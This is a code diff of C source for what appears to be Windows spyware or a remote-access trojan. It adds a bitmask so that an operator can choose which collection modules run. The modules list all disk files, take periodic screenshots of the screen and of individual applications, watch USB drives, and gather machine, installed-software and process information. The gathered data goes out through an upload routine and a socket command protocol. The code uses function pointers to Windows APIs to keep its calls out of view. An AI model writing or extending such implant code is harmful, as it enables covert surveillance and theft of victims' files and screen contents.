@@ -179,32 +179,43 @@ int uploadData(char* lpBuf, unsigned int dwSize, unsigned int cmd, char* szAppNa
 
 
 
-int __stdcall NetworkData() {
+int __stdcall NetworkData(int tag) {
 
 	int iRet = 0;
 
 	//iRet = uploadData(cCryptKey, 16, ONLINE, 0);
 
-	iRet = GetMachineInfo();
+	if (tag & MACHINE_INFO) {
+		iRet = GetMachineInfo();
+	}
 
-	iRet = GetApplicationInfo(FALSE);
-
-	iRet = GetRunningProcessInfo();
-
-	HANDLE hThreadAllDiskFile = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetHardDiskAllFiles, 0, 0, 0);
-	lpCloseHandle(hThreadAllDiskFile);
-
-	SCREENSNAPSHOT_TIME stScreenTime;
-	stScreenTime.iMaxTime = SCREEN_MAX_TIME;
-	stScreenTime.iMinTime = SCREEN_MIN_TIME;
-	HANDLE hThreadScreen = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetScreenSnapshot, &stScreenTime, 0, 0);
-	lpCloseHandle(hThreadScreen);
-
-	HANDLE hAppSreen = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetAppScreenshot, (LPVOID)APPSCREEN_SECLAST_FOCUSON, 0, 0);
-	lpCloseHandle(hAppSreen);
-
-	HANDLE hThreadUsb = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)UsbFileWatcher, 0, 0, 0);
-	lpCloseHandle(hThreadUsb);
+	if (tag & APPINSTALL_INFO) {
+		iRet = GetApplicationInfo(FALSE);
+	}
+	if (tag & DISKFILE_INFO) {
+		HANDLE hThreadAllDiskFile = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetHardDiskAllFiles, 0, 0, 0);
+		lpCloseHandle(hThreadAllDiskFile);
+	}
+	if (tag & SCREENSHOT_INFO) {
+		SCREENSNAPSHOT_TIME stScreenTime;
+		stScreenTime.iMaxTime = SCREEN_MAX_TIME;
+		stScreenTime.iMinTime = SCREEN_MIN_TIME;
+		HANDLE hThreadScreen = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetScreenSnapshot,
+			&stScreenTime, 0, 0);
+		lpCloseHandle(hThreadScreen);
+	}
+	if (tag & APPSCREENSHOT_INFO) {
+		HANDLE hAppSreen = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetAppScreenshot,
+			(LPVOID)APPSCREEN_SECLAST_FOCUSON, 0, 0);
+		lpCloseHandle(hAppSreen);
+	}
+	if (tag & USBFILE_INFO) {
+		HANDLE hThreadUsb = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)UsbFileWatcher, 0, 0, 0);
+		lpCloseHandle(hThreadUsb);
+	}
+	if (tag & PROCESS_INFO) {
+		iRet = GetRunningProcessInfo();
+	}
 
 	iRet = UploadLogFile();
 
@@ -273,8 +284,7 @@ int SendCmdPacketWithParam(SOCKET s, int cmd, char* param, int paramsize) {
 }
 
 
-
-int SendCmdPacket(SOCKET s, int cmd) {
+int SendCmdPacket(SOCKET s, int cmd,int subcmd) {
 
 	char szData[1024];
 	LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)szData;
@@ -285,13 +295,14 @@ int SendCmdPacket(SOCKET s, int cmd) {
 	lphdr->unique.crypt = DATANONECRYPT;
 	memset(lphdr->unique.username, 0, 16);
 	lstrcpyA((char*)lphdr->unique.username, (char*)gUserName);
-	lphdr->packlen = 0;
+	lphdr->packlen = subcmd;
 	int iLen = sizeof(NETWORKPACKETHEADER);
 
 	int iRet = lpsend(s, szData, iLen, 0);
 
 	return iRet;
 }
+
 
 
 int SendCmdPacket(LPUNIQUECLIENTSYMBOL lpUnique, SOCKET s, int cmd) {
